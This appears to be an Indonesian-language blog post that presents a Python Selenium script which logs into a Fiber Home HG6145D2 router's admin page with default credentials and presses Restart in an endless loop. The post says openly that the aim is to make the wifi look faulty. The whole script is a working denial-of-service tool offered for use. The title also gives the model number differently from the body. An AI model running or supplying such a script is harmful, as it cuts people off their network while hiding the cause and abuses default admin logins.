---
date: '2025-06-11T21:05:42+08:00'
draft: False
title: 'Automasi Reboot Router (Fiber Home HG614D2)'
---
Script untuk mereboot router secara terus menerus, sehingga membuat wifi / router tampak seperti dalam gangguan / masalah.

Contoh kasus :
- Router Fiber Home HG6145D2

Requirement:
- Python
- [Library selenium](https://pypi.org/project/selenium/)
- Webdriver dari browser ([ChromeDriver](https://googlechromelabs.github.io/chrome-for-testing/) : driver dari browser chrome)

Code:
```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
import os
import time

username = "user"
password = "user1234"

os.environ['PATH'] = r'D:\\2.Area\\python\\automation_reboot\\chromedriver'
options = Options()
options.add_argument("--no-sandbox")
options.add_argument("--headless")
driver = webdriver.Chrome(options=options)

  
def reboot():
    try:
        driver.get("http://192.168.1.1/html/login_inter.html")
        driver.find_element("id","user_name").send_keys(username)
        driver.find_element("id","loginpp").send_keys(password)
        driver.find_element("id","login_btn").click()
        time.sleep(3)

        driver.find_element("id","first_menu_manage").click()
        time.sleep(3)

        driver.find_element("id","span_device_admin").click()
        time.sleep(3)

        a = driver.find_element(By.CSS_SELECTOR, "iframe")
        driver.switch_to.frame(a)
        driver.find_element(By.ID, "Restart_button").click()

        wait = WebDriverWait(driver, timeout=2)

        alert = wait.until(lambda d : d.switch_to.alert)
        alert.accept()
        time.sleep(3)

        print("berhasil reboot")

    except Exception:
        time.sleep(30)
        print("error")

def main():
    while(True):
        reboot()

if __name__ == "__main__":
    main()
```